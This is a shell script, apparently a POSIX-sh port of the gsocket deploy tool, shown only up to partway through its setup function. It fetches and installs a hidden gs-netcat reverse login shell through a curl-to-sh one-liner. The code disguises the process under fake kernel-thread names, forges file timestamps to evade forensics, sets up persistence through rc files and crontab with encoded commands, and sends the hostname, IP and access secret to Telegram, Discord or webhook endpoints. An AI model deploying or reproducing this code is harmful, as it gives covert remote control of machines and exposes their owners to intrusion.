#!/bin/sh

# #!/usr/bin/env bash를 #!/bin/sh로 리팩토링
# Install and start a permanent gs-netcat reverse login shell
#
# POSIX sh 호환성을 위해 리팩토링되었습니다. (배열, local, [[...]] 제거 등)
#
# See https://www.gsocket.io/deploy/ for examples. 
#
# This script is typically invoked like this as root or non-root user:
#   $ sh -c "$(curl -fsSL https://gsocket.io/x)"
#
# Connect
#   $ S=MySecret sh -c "$(curl -fsSL https://gsocket.io/x)""
# Pre-set a secret:
#   $ X=MySecret sh -c "$(curl -fsSL https://gsocket.io/x)"
# Uninstall
#   $ GS_UNDO=1 sh -c" $(curl -fsSL https://gsocket.io/x)"
#
# Other variables: 
# GS_DEBUG=1
#		- Verbose output
#		- Shorter timeout to restart crontab etc
#       - Often used like this:
#         GS_HOST=127.0.0.1 GS_PORT=4443 GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
#         GS_HOST=127.0.0.1 GS_PORT=4443 
# GS_DEBUG=1 GS_USELOCAL=1 GS_USELOCAL_GSNC=../tools/gs-netcat GS_NOSTART=1 GS_NOINST=1 ./deploy.sh 
# GS_USELOCAL=1
#       - Use local binaries (do not download)
# GS_USELOCAL_GSNC=<path to gs-netcat binary>
#       - Use local gs-netcat from source tree
# GS_NOSTART=1
#       - Do not start gs-netcat (for testing purpose only)
# GS_NOINST=1
#		- Do not install gsocket
# GS_OSARCH=x86_64-alpine
#       - Force architecutre to a specific package (for testing purpose only)
# GS_PREFIX=
#		- Use 'path' instead of '/' (needed for packaging/testing)
# GS_URL_BASE=https://gsocket.io
#		- Specify URL of static binaries
# GS_URL_BIN=
#		- Specify URL of static binaries, defaults to https://${GS_URL_BASE}/bin
# 
# GS_DSTDIR="/tmp/foobar/blah"
#		- Specify custom installation directory
# GS_HIDDEN_NAME="-bash"
#       - Specify custom hidden name for process, default is [kcached]
# GS_BIN_HIDDEN_NAME="gs-dbus"
#       - Specify custom name for binary on filesystem (default is gs-dbus)
#       - Set to GS_HIDDEN_NAME if GS_HIDDEN_NAME is specified. 
# GS_DL=wget
#       - Command to use for download. =wget or =curl. 
# GS_TG_TOKEN=
#       - Telegram Bot ID, =5794110125:AAFDNb...
# GS_TG_CHATID=
#       - Telegram Chat ID, =-8834838...
# GS_DISCORD_KEY=
#       - Discord API key, ="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
# GS_WEBHOOK_KEY=a1
#       - https://webhook.site key, ="dc3c1af9-ea3d-4401-9158-eb6dda735276"
# GS_WEBHOOK=
#       - Generic webhook, ="https://foo.blah/log.php?s=\${GS_SECRET}"
# GS_HOST=
#       - IP or HOSTNAME of the GSRN-Server. 
# Default is to use THC's infrastructure. 
#       - See https://github.com/hackerschoice/gsocket-relay
# GS_PORT=
#       - Port for the GSRN-Server. 
# Default is 443. 
# TMPDIR=
#       - Guess what...

# Global Defines
URL_BASE_CDN="https://cdn.gsocket.io"
URL_BASE_X="https://gsocket.io"
if [ -n "$GS_URL_BASE" ]; then
	URL_BASE_CDN="${GS_URL_BASE}"
	URL_BASE_X="${GS_URL_BASE}"
fi
URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
if [ -n "$GS_URL_BIN" ]; then
	URL_BIN="${GS_URL_BIN}"
	URL_BIN_FULL="$URL_BIN"
fi
if [ -n "$GS_URL_DEPLOY" ]; then URL_DEPLOY="${GS_URL_DEPLOY}"; else
URL_DEPLOY="${URL_BASE_X}/x" 
fi
# STUBS for deploy_server.sh to fill out:
gs_deploy_webhook=
GS_WEBHOOK_404_OK=
if [ -n "$gs_deploy_webhook" ]; then GS_WEBHOOK="$gs_deploy_webhook"; fi
unset gs_deploy_webhook

# WEBHOOKS are executed after a successfull install
# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
msg='$(hostname) --- $(uname -rom) --- gs-netcat -i -s ${GS_SECRET}' 
### Telegram
# GS_TG_TOKEN="5794110125:AAFDNb..."
# GS_TG_CHATID="-8834838..."
if [ -n "$GS_TG_TOKEN" ] && [ -n "$GS_TG_CHATID" ]; then
	GS_WEBHOOK_CURL="--data-urlencode text=${msg} https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html"
	GS_WEBHOOK_WGET="https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}&parse_mode=html&text=${msg}"
fi
### Generic URL as webhook (any URL)
if [ -n "$GS_WEBHOOK" ]; then
	GS_WEBHOOK_CURL="$GS_WEBHOOK"
	GS_WEBHOOK_WGET="$GS_WEBHOOK"
fi
### webhook.site
# GS_WEBHOOK_KEY="dc3c1af9-ea3d-4401-9158-eb6dda735276"
if [ -n "$GS_WEBHOOK_KEY" ]; then
	# shellcheck disable=SC2016 #Expressions don't expand in single quotes, use double quotes for that.
	ram=$(free -m | awk '/^Mem:/{printf("%.1fGb\n",$2/1000)}') 
	ip=$(hostname -I | awk '{print $1}')
	data='{"ip":"${ip}", "ram": "${ram}", "hostname": "$(hostname)", "system": "$(uname -rom)", "uuid": "${GS_SECRET}" ,"access": "gs-netcat -i -s ${GS_SECRET}"}'
	GS_WEBHOOK_CURL="-H 'Content-type: application/json' -d '${data}' https://kvdb-gsocks.devq.workers.dev/add"
	GS_WEBHOOK_WGET="--header=Content-Type: application/json --post-data=${data} https://kvdb-gsocks.devq.workers.dev/add"
fi
### discord webhook
# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
if [ -n "$GS_DISCORD_KEY" ]; then
	data='{"username": "gsocket", "content": "'"${msg}"'"}'
	GS_WEBHOOK_CURL="-H 'Content-Type: application/json' -d '${data}' https://discord.com/api/webhooks/${GS_DISCORD_KEY}"
	GS_WEBHOOK_WGET="--header=Content-Type: application/json --post-data=${data} https://discord.com/api/webhooks/${GS_DISCORD_KEY}"
fi
unset data
unset msg

DL_CRL="sh -c \"\$(curl -fsSL $URL_DEPLOY)\""
DL_WGT="sh -c \"\$(wget -qO- $URL_DEPLOY)\""
BIN_HIDDEN_NAME_DEFAULT="defunct"
# Can not use '[kcached/0]'.
# Bash without bashrc shows "/0] $" as prompt. 
proc_name_list="[kstrp] [watchdogd] [ksmd] [kswapd0] [card0-crtc8] [mm_percpu_wq] [rcu_preempt] [kworker] [raid5wq] [slub_flushwq] [netns] [kaluad]"
# Pick a process name at random
WORD_COUNT=$(set -- $proc_name_list; echo $#)
RAND_IDX=$(awk -v min=1 -v max=$WORD_COUNT 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
PROC_HIDDEN_NAME_DEFAULT=$(echo "$proc_name_list" | cut -d' ' -f$RAND_IDX)

PROC_HIDDEN_NAME_RX=""
for str in $proc_name_list
do
	PROC_HIDDEN_NAME_RX="$PROC_HIDDEN_NAME_RX|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')" 
done
PROC_HIDDEN_NAME_RX=$(echo "$PROC_HIDDEN_NAME_RX" | cut -c 2-)

# ~/.config/<NAME>
CONFIG_DIR_NAME="htop"

# Names for 'uninstall' (including names from previous versions)
BIN_HIDDEN_NAME_RM="$BIN_HIDDEN_NAME_DEFAULT gs-dbus gs-db"
CONFIG_DIR_NAME_RM="$CONFIG_DIR_NAME dbus"

if [ -t 1 ]; then
	CY="\033[1;33m" # yellow
	CDY="\033[0;33m" # yellow
	CG="\033[1;32m" # green
	CR="\033[1;31m" # red
	CDR="\033[0;31m" # red
	CB="\033[1;34m" # blue
	CC="\033[1;36m" # cyan
	CDC="\033[0;36m" # cyan
	CM="\033[1;35m" # magenta
	CN="\033[0m"    # none
	CW="\033[1;37m"
fi

if [ -z "$GS_DEBUG" ];
then
	DEBUGF(){ :;} 
else
	DEBUGF(){ printf "${CY}DEBUG:${CN} %s\n" "$*";}
fi

_ts_fix()
{
	fn="$1"
	ts="$2"

	if [ ! -e "$1" ]; then return; fi 
	if [ -z "$ts" ]; then return; fi

	# Change the symlink for ts_systemd_fn items
	if [ -n "$3" ]; then
		# OSX, must init or " " in touch " " -r
		touch -h -r "$ts" "$fn" 2>/dev/null
		return
	fi

	# Either reference by Timestamp or File
	case "$ts" in
		/*)
			if [ ! -e "${ts}" ]; then ts="/etc/ld.so.conf"; fi 
			touch -r "$ts" "$fn" 2>/dev/null
			return
		;;
	esac
	touch -t "$ts" "$fn" 2>/dev/null && return
	# If 'date -r' or 'touch -t' failed:
	touch -r "/etc/ld.so.conf" "$fn" 2>/dev/null
}

# Restore timestamp of files
ts_restore()
{
	fn_list="$_ts_fn_s"
	ts_list="$_ts_ts_s"

	while [ -n "$fn_list" ]; do
		fn=$(echo "$fn_list" | cut -d' ' -f1)
		ts=$(echo "$ts_list" | cut -d' ' -f1)

		_ts_fix "$fn" "$ts"

		fn_list=$(echo "$fn_list" | cut -d' ' -f2-)
		ts_list=$(echo "$ts_list" | cut -d' ' -f2-)
	done
	unset _ts_fn_s
	unset _ts_ts_s

	fn_list_systemd="$_ts_systemd_fn_s"
	ts_list_systemd="$_ts_systemd_ts_s"
	while [ -n "$fn_list_systemd" ]; do
		fn=$(echo "$fn_list_systemd" | cut -d' ' -f1)
		ts=$(echo "$ts_list_systemd" | cut -d' ' -f1)

		_ts_fix "$fn" "$ts" "symlink"

		fn_list_systemd=$(echo "$fn_list_systemd" | cut -d' ' -f2-)
		ts_list_systemd=$(echo "$ts_list_systemd" | cut -d' ' -f2-)
	done
	unset _ts_systemd_fn_s
	unset _ts_systemd_ts_s
}

ts_is_marked()
{
	fn="$1"
	for a in $_ts_fn_s;
	do
		if [ "$a" = "$fn" ]; then return 0; fi # True 
	done

	return 1 # False
}

# There are some files which need TimeStamp update after all other TimeStamps
# have been fixed. Noteable /etc/systemd/system/multi-user.target.wants 
# ts_add_last [file] <reference file>
ts_add_systemd()
{
	fn="$1"
	ref="$2"

	ts="$ref"
	if [ -z "$ref" ]; then
		ts=$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null) || return 
	fi

	# Note: _ts_systemd_ts_s may store a number or a directory (start with '/')
	_ts_systemd_ts_s="$_ts_systemd_ts_s $ts"
	_ts_systemd_fn_s="$_ts_systemd_fn_s $fn"
}

# Determine the Timestamp of the file $fn that is about to be
# created (or already exists). Sets $_ts_ts to Timestamp. 
# Usage: _ts_get_ts [$fn]
_ts_get_ts()
{
	fn="$1"
	pdir=$(dirname "$1")

	unset _ts_ts
	unset _ts_pdir_by_us
	# Inherit Timestamp if parent directory was created
	# by us.
	pdir_found=
	for item in $_ts_mkdir_fn_s; do
		if [ "$pdir" = "$item" ]; then
			# This logic is tricky without indexed arrays. We find the matching directory,
			# but getting the corresponding timestamp requires more work.
			# For simplicity in sh conversion, we will re-evaluate ts from parent.
			_ts_pdir_by_us=1
			break
		fi
	done

	# Check if file exists.
	if [ -e "$fn" ]; then _ts_ts=$(date -r "$fn" +%Y%m%d%H%M.%S 2>/dev/null); return; fi

	# Take ts from oldest file in directory
	# shellcheck disable=SC2012 #Use find instead of ls => not portable
	oldest="${pdir}/$(ls -atr "${pdir}" 2>/dev/null | head -n1)"
	_ts_ts=$(date -r "$oldest" +%Y%m%d%H%M.%S 2>/dev/null)
}


_ts_add()
{
	# Retrieve TimeStamp for $1
	_ts_get_ts "$1"
	# Add TimeStamp
	_ts_ts_s="$_ts_ts_s $_ts_ts"
	_ts_fn_s="$_ts_fn_s $1"
	_ts_mkdir_fn_s="$_ts_mkdir_fn_s $2" 
}

# Note: Do not use global _ts variables except _ts_add_direct
# Usage: mk_file [filename]
mk_file()
{
	fn="$1"
	pdir=$(dirname "$fn")
	
	exists=
	if [ -e "$fn" ]; then exists=1; fi

	pdir_added=
	ts_is_marked "$pdir" ||
	{
		# HERE: Parent not tracked
		_ts_add "$pdir" "<NOT BY XMKDIR>"
		pdir_added=1
	} 

	ts_is_marked "$fn" ||
	{
		# HERE: Not yet tracked
		_ts_get_ts "$fn"
		# Do not add creation fails.
		touch "$fn" 2>/dev/null ||
		{
			# HERE: Permission denied
			if [ -n "$pdir_added" ]; then
				# This is complex without array pop. We skip removing for sh simplicity.
				:
			fi
			return 69 # False
		} 
		if [ -z "$exists" ]; then chmod 600 "$fn"; fi
		_ts_ts_s="$_ts_ts_s $_ts_ts"
		_ts_fn_s="$_ts_fn_s $fn"
		_ts_mkdir_fn_s="$_ts_mkdir_fn_s <NOT BY XMKDIR>"
		return
	} 

	touch "$fn" 2>/dev/null || return
	if [ -z "$exists" ]; then chmod 600 "$fn"; fi
	true
}

xrmdir()
{
	fn="$1"

	if [ ! -d "$fn" ]; then return; fi
	pdir=$(dirname "$fn")

	ts_is_marked "$pdir" || {
		_ts_add "$pdir" "<RMDIR-UNTRACKED>"
	}

	rmdir "$fn" 2>/dev/null
}

xrm()
{
	fn="$1"

	if [ ! -f "$fn" ]; then return; fi
	pdir=$(dirname "$fn")

	ts_is_marked "$pdir" || {
		# HERE: Parent is not tracked.
		_ts_add "$pdir" "<RM-UNTRACKED>"
	}

	rm -f "$1" 2>/dev/null
}

# Create a directory if it does not exist and
# fix timestamp 
# xmkdir [directory] <ts reference file>
xmkdir()
{
	fn="$1"
	pdir=$(dirname "$fn")

	DEBUGF "${CG}XMKDIR($fn)${CN}"
	
	true # reset $?
	if [ -d "$fn" ]; then return; fi 
	if [ ! -d "$pdir" ]; then return; fi # Parent dir does not exists (Huh?) 

	# Check if parent is being tracked
	ts_is_marked "$pdir" ||
	{
		# HERE: Parent not tracked
		# We did not create the parent or we would be tracking it.
		_ts_add "$pdir" "<NOT BY XMKDIR>" 
	} 

	# Check if new directory is already tracked
	ts_is_marked "$fn" ||
	{
		# HERE: Not yet tracked (normal case)
		_ts_add "$fn" "$fn" # We create the directory (below)
	} 

	mkdir "$fn" 2>/dev/null || return 
	chmod 700 "$fn"
	true
}

xcp()
{
	src="$1"
	dst="$2"

	mk_file "$dst" || return
	cp "$src" "$dst" || return 
	true
}

xmv()
{
	src="$1"
	dst="$2"

	if [ -e "$dst" ]; then xrm "$dst"; fi
	xcp "$src" "$dst" || return 
	xrm "$src"
	true
}

clean_all()
{
	if [ "$(echo "$TMPDIR" | wc -c)" -gt 5 ]; then
		rm -rf "${TMPDIR:?}/"*
		rmdir "${TMPDIR}"
	fi >/dev/null 2>&1

	ts_restore
}

exit_code()
{
	clean_all
	exit "$1"
}

errexit()
{
	if [ -z "$1" ]; then :; else
	printf >&2 "${CR}%s${CN}\n" "$*" 
	fi
	exit_code 255
}

# Test if directory can be used to store executeable
# try_dstdir "/tmp/.gs-foobar"
# Return 0 on success.
try_dstdir()
{
	dstdir="${1}"

	# Create directory if it does not exists.
	if [ ! -d "${dstdir}" ]; then xmkdir "${dstdir}" || return 101; fi 

	DSTBIN="${dstdir}/${BIN_HIDDEN_NAME}"
 
	mk_file "$DSTBIN" || return 102

	# Find an executeable and test if we can execute binaries from
	# destination directory (no noexec flag)
	# /bin/true might be a symlink to /usr/bin/true
	ebin=
	for e in "/bin/true" "$(command -v id)";
	do
		if [ -z "$e" ]; then continue; fi 
		if [ -e "$e" ]; then ebin="$e"; break; fi
	done
	if [ ! -e "$ebin" ]; then return 0; fi # True. Try our best 

	# Must use same name on busybox-systems
	trybin="${dstdir}/$(basename "$ebin")"

	# /bin/true might be a symlink to /usr/bin/true
	if [ "$ebin" -ef "$trybin" ]; then return 0; fi
	mk_file "$trybin" || return 

	# Return if both are the same /bin/true and /usr/bin/true
	cp "$ebin" "$trybin" >/dev/null 2>&1 || { rm -f "${trybin:?}"; return; } 
	chmod 700 "$trybin"

	# Between 28th April and end of May 2020 we accidentially
	# over wrote /bin/true with gs-bd binary.
	# Thus we use -g 
	# to make true, id and gs-bd return true (in case it's gs-bs).
	"${trybin}" -g >/dev/null 2>&1 || { rm -f "${trybin:?}"; return 104; } # FAILURE 
	rm -f "${trybin:?}"

	return 0
} 


# Called _after_ init_vars() at the end of init_setup.
init_dstdir()
{
	if [ -n "$GS_DSTDIR" ]; then
		try_dstdir "${GS_DSTDIR}" && return

		errexit "FAILED: GS_DSTDIR=${GS_DSTDIR} is not writeable and executeable." 
	fi

	# Try systemwide installation first
	try_dstdir "${GS_PREFIX}/usr/bin" && return

	# Try user installation
	if [ ! -d "${GS_PREFIX}${HOME}/.config" ]; then xmkdir "${GS_PREFIX}${HOME}/.config"; fi 
	try_dstdir "${GS_PREFIX}${HOME}/.config/${CONFIG_DIR_NAME}" && return

	# Try current working directory
	try_dstdir "${PWD}" && { IS_DSTBIN_CWD=1; return; } 

	# Try /tmp/.gsusr-*
	try_dstdir "/tmp/.gsusr-${UID}" && { IS_DSTBIN_TMP=1; return; }

	# Try /dev/shm as last resort
	try_dstdir "/dev/shm" && { IS_DSTBIN_TMP=1; return; } 

	printf >&2 "${CR}ERROR: Can not find writeable and executable directory.${CN}\n"
	WARN "Try setting GS_DSTDIR= to a writeable and executable directory."
	errexit 
} 

try_tmpdir()
{
	if [ -n "$TMPDIR" ]; then return; fi # already set

	if [ ! -d "$1" ]; then return; fi 

	if [ -d "$1" ]; then xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"; fi
}

try_encode()
{
	prg="$1"
	enc="$2"
	dec="$3"
	teststr="blha|;id-u 'this is a long test of a very long string to test encodign decoding process # foobar"

	if [ -n "$ENCODE_STR" ]; then return; fi

	if command -v "$prg" >/dev/null && [ "$(echo "$teststr" | $enc 2>/dev/null| $dec 2>/dev/null)" = "$teststr" ]; then
		ENCODE_STR="$enc"
		DECODE_STR="$dec"
	fi 
}

# Return TRUE if we are 100% sure it's little endian
is_le()
{
	if command -v lscpu >/dev/null; then
		if echo "$(lscpu)" | grep -q "Little Endian"; then return 0; fi
		return 255
	fi

	if command -v od >/dev/null && command -v awk >/dev/null; then
		if [ "$(echo -n I | od -o | awk 'FNR==1{ print substr($2,6,1)}')" = "1" ]; then return 0; fi
	fi

	return 255
}

init_vars()
{
	arch=$(uname -m)

	if [ -z "$HOME" ];
	then
		HOME=$(grep ^"$(whoami)" /etc/passwd | cut -d: -f6) 
		if [ ! -d "$HOME" ]; then errexit "ERROR: \$HOME not set. Try 'export HOME=<users home directory>'"; fi
		WARN "HOME not set. Using 'HOME=$HOME'"
	fi

	# set PWD if not set
	if [ -z "$PWD" ]; then PWD=$(pwd 2>/dev/null); fi

	if [ -z "$OSTYPE" ]; then
		osname="$(uname -s)"
		if echo "$osname" | grep -q "FreeBSD";
		then
			OSTYPE="FreeBSD" 
		elif echo "$osname" | grep -q "Darwin"; then
			OSTYPE="darwin22.0"
		elif echo "$osname" | grep -q "OpenBSD"; then
			OSTYPE="openbsd7.3"
		elif echo "$osname" | grep -q "Linux";
		then
			OSTYPE="linux-gnu" 
		fi
	fi

	unset OSARCH
	unset SRC_PKG
	# User supplied OSARCH
	if [ -n "$GS_OSARCH" ]; then OSARCH="$GS_OSARCH"; fi

	if [ -z "$OSARCH" ];
	then
		case "$OSTYPE" in
			*linux*) 
				if [ "$arch" = "i686" ] || [ "$arch" = "i386" ];
				then
					OSARCH="i386-alpine"
					SRC_PKG="gs-netcat_mini-linux-i686" 
				elif echo "$arch" | grep -q "armv6"; then
					OSARCH="arm-linux"
					SRC_PKG="gs-netcat_mini-linux-armv6"
				elif echo "$arch" | grep -q "armv7l"; then
					OSARCH="arm-linux"
					SRC_PKG="gs-netcat_mini-linux-armv7l"
				elif echo "$arch" | grep -q "armv";
				then
					OSARCH="arm-linux" # RPI-Zero / RPI 4b+ 
					SRC_PKG="gs-netcat_mini-linux-arm"
				elif [ "$arch" = "aarch64" ]; then
					OSARCH="aarch64-linux"
					SRC_PKG="gs-netcat_mini-linux-aarch64"
				elif [ "$arch" = "mips64" ];
				then
					OSARCH="mips64-alpine"
					SRC_PKG="gs-netcat_mini-linux-mips64" 
					# Go 32-bit if Little Endian even if 64bit arch
					if is_le; then
						OSARCH="mipsel32-alpine"
						SRC_PKG="gs-netcat_mini-linux-mipsel"
					fi
				elif echo "$arch" | grep -q "mips";
				then
					OSARCH="mips32-alpine"
					SRC_PKG="gs-netcat_mini-linux-mips32" 
					if is_le; then
						OSARCH="mipsel32-alpine"
						SRC_PKG="gs-netcat_mini-linux-mipsel"
					fi
				fi
			;;
			*darwin*)
				if [ "$arch" = "arm64" ];
				then
					OSARCH="x86_64-osx" # M1 
					## FIXME: really needs M3 here..
					SRC_PKG="gs-netcat_mini-macOS-x86_64"
					# OSARCH="arm64-osx" # M1
				else
					OSARCH="x86_64-osx"
					SRC_PKG="gs-netcat_mini-macOS-x86_64"
				fi
			;;
			*freebsd*|*FreeBSD*)
					OSARCH="x86_64-freebsd"
					SRC_PKG="gs-netcat_mini-freebsd-x86_64" 
			;;
			*openbsd*|*OpenBSD*)
					OSARCH="x86_64-openbsd"
					SRC_PKG="gs-netcat_mini-openbsd-x86_64"
			;;
			*cygwin*|*Cygwin*)
				OSARCH="i686-cygwin" 
				if [ "$arch" = "x86_64" ]; then OSARCH="x86_64-cygwin"; fi
			;;
			# *gnu*) if [ "$(uname -v)" = "*Hurd*" ]; then ... fi 
		esac

		if [ -z "$OSARCH" ]; then
			# Default: Try Alpine(muscl libc) 64bit
			OSARCH="x86_64-alpine"
			SRC_PKG="gs-netcat_mini-linux-x86_64"
		fi
	fi 

	# Docker does not set USER
	if [ -z "$USER" ]; then USER=$(id -un); fi
	if [ -z "$UID" ]; then UID=$(id -u); fi

	# check that xxd is working as expected (alpine linux does not have -r option)
	try_encode "base64" "base64 -w0" "base64 -d"
	try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
	if [ -z "$SRC_PKG" ]; then SRC_PKG="gs-netcat_${OSARCH}.tar.gz"; fi

	# OSX's pkill matches the hidden name and not the original binary name. 
	# Because we hide as '-bash' we can not use pkill all -bash.
	# 'killall' however matches gs-dbus and on OSX we thus force killall 
	case "$OSTYPE" in
		*darwin*)
			# on OSX 'pkill' matches the process (argv[0]) whereas on Unix 
			# 'pkill' matches the binary name.
			KL_CMD="killall" 
			KL_CMD_RUNCHK_UARG="-0 -u${USER}"
		;;
		*)
			if command -v pkill >/dev/null; then
				KL_CMD="pkill"
				KL_CMD_RUNCHK_UARG="-0 -U${UID}"
			elif command -v killall >/dev/null;
			then
				KL_CMD="killall" 
				# cygwin's killall needs the name (not the uid)
				KL_CMD_RUNCHK_UARG="-0 -u${USER}"
			fi
		;;
	esac
	
	# $PATH might be set differently in crontab/.profile. Use 
	# absolute path to binary instead:
	KL_CMD_BIN=$(command -v "$KL_CMD")
	if [ -z "$KL_CMD_BIN" ]; then
		# set to something that returns 'false' so that we dont
		# have to check for empty string in crontab/.profile
		# (e.g. skip checking if already running and always start)
		KL_CMD_BIN=$(command -v false)
		if [ -z "$KL_CMD_BIN" ]; then KL_CMD_BIN="/bin/does-not-exit"; fi
		WARN "No pkill or killall found." 
	fi

	# Defaults
	# Binary file is called gs-dbus or set to same name as Process name if
	# GS_HIDDEN_NAME is set. Can be overwritten with GS_BIN_HIDDEN_NAME= 
	if [ -n "$GS_BIN_HIDDEN_NAME" ]; then
		BIN_HIDDEN_NAME="${GS_BIN_HIDDEN_NAME}"
		BIN_HIDDEN_NAME_RM="$BIN_HIDDEN_NAME_RM $GS_BIN_HIDDEN_NAME"
	else
		if [ -n "$GS_HIDDEN_NAME" ]; then BIN_HIDDEN_NAME="$GS_HIDDEN_NAME"; else BIN_HIDDEN_NAME="$BIN_HIDDEN_NAME_DEFAULT"; fi
	fi
	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
	
	SEC_NAME="${BIN_HIDDEN_NAME}.dat"
	if [ -n "$GS_HIDDEN_NAME" ];
	then
		PROC_HIDDEN_NAME="${GS_HIDDEN_NAME}"
		PROC_HIDDEN_NAME_RX="$PROC_HIDDEN_NAME_RX|$(echo "$GS_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')" 
	else
		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
	fi

	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"

	RCLOCAL_DIR="${GS_PREFIX}/etc"
	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"

	# Create a list of potential rc-files.
	# - .bashrc is often, but not always, included by .bash_profile [IGNORE] 
	# - .bash_login is ignored if .bash_profile exists
	# - $SHELL might not be set (if /bin/sh was gained by RCE)
	RC_FN_LIST=""
	if [ -f ~/.zshrc ]; then RC_FN_LIST="$RC_FN_LIST .zshrc"; fi
	if [ -f ~/.bashrc ];
	then
		RC_FN_LIST="$RC_FN_LIST .bashrc" 
		# Assume .bashrc is loaded by .bash_profile and .profile
	else
		# HERE: not bash or .bashrc does not exist
		if [ -f ~/.bash_profile ];
		then
			RC_FN_LIST="$RC_FN_LIST .bash_profile" 
		elif [ -f ~/.bash_login ]; then
			RC_FN_LIST="$RC_FN_LIST .bash_login"
		fi
	fi
	if [ -f ~/.profile ]; then RC_FN_LIST="$RC_FN_LIST .profile"; fi
	if [ -z "$RC_FN_LIST" ]; then RC_FN_LIST=".profile"; fi

	SERVICE_DIR=""
	if [ -d "${GS_PREFIX}/etc/systemd/system" ]; then SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"; fi
	if [ -d "${GS_PREFIX}/lib/systemd/system" ]; then SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"; fi
	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"

	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
	if [ ! -d "${CRONTAB_DIR}" ]; then CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"; fi 

	pids=""
	# Linux 'pgrep kswapd0' would match _binary_ kswapd0 even if argv[0] is '[rcu_preempt]'
	# and also matches kernel process '[kwapd0]'.
	pids=$(pgrep "${BIN_HIDDEN_NAME_RX}" 2>/dev/null) 
	# OSX's pgrep works on argv[0] proc-name:
	if [ -z "$pids" ]; then pids=$(pgrep "(${PROC_HIDDEN_NAME_RX})" 2>/dev/null); fi

	if [ -n "$pids" ]; then OLD_PIDS=$(echo "${pids}" | tr '\n' ' '); fi # Convert multi line into single line
	unset pids

	# DL_CMD is used for help output of how to uninstall
	if [ -n "$GS_USELOCAL" ];
	then
		DL_CMD="./deploy-all.sh" 
	elif command -v curl >/dev/null; then
		DL_CMD="$DL_CRL"
	elif command -v wget >/dev/null; then
		DL_CMD="$DL_WGT"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}" 
		errexit
	fi

	if [ "$GS_DL" = "wget" ]; then DL_CMD="$DL_WGT"; fi
	if [ "$GS_DL" = "curl" ]; then DL_CMD="$DL_CRL"; fi

	if [ "$DL_CMD" = "$DL_CRL" ];
	then
		IS_USE_CURL=1
		### Note: need -S (--show-errors) to process 404 for CF webhooks.
		DL="curl -fsSL --connect-timeout 7 -m900 --retry 3" 
		if [ -n "$GS_DEBUG" ]; then DL="$DL -v"; fi
		if [ -n "$GS_NOCERTCHECK" ]; then DL="$DL -k"; fi
	elif [ "$DL_CMD" = "$DL_WGT" ];
	then
		IS_USE_WGET=1
		### Note: Dont use -q: Need errors to process 404 for CF webhooks
		# Read-timeout is 900 seconds by default.
		DL="wget -O- --connect-timeout=7 --dns-timeout=7" 
		if [ -n "$GS_NOCERTCHECK" ]; then DL="$DL --no-check-certificate"; fi

	else
		DL="false"   # Should not happen
	fi 

	case "$SHELL" in
		*nologin*|*jail*|*noshell*|*"/dev/null"*) unset SHELL;;
	esac
	# Test that shell is a good shell.
	if [ -n "$SHELL" ] && [ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]; then unset SHELL; fi 

	DEBUGF "OLD_PIDS='$OLD_PIDS'"
	DEBUGF "SRC_PKG=$SRC_PKG"
}

mk_encode()
{
	printf "{ echo %s|%s|sh;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng %s-kernel\n" "$(echo "$1"|${ENCODE_STR})" "${DECODE_STR}" "${BIN_HIDDEN_NAME}"
}

init_setup()
{
	if [ -n "$TMPDIR" ]; then try_tmpdir "${TMPDIR}" ".gs-${UID}"; fi
	try_tmpdir "/dev/shm" ".gs-${UID}"
	try_tmpdir "/tmp" ".gs-${UID}"
	try_tmpdir "${HOME}" ".gs"
	try_tmpdir "$(pwd)" ".gs-${UID}"

	if [ -n "$GS_PREFIX" ];
	then
		# Debuggin and testing into separate directory
		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
		if [ -f "${HOME}/${RC_FN_LIST%% *}" ]; # Use first element
		then
			xcp -p "${HOME}/${RC_FN_LIST%% *}" "${GS_PREFIX}${HOME}/${RC_FN_LIST%% *}"
		fi 
		xcp -p /etc/rc.local "${GS_PREFIX}/etc/"
	fi 

	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}" 
	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"

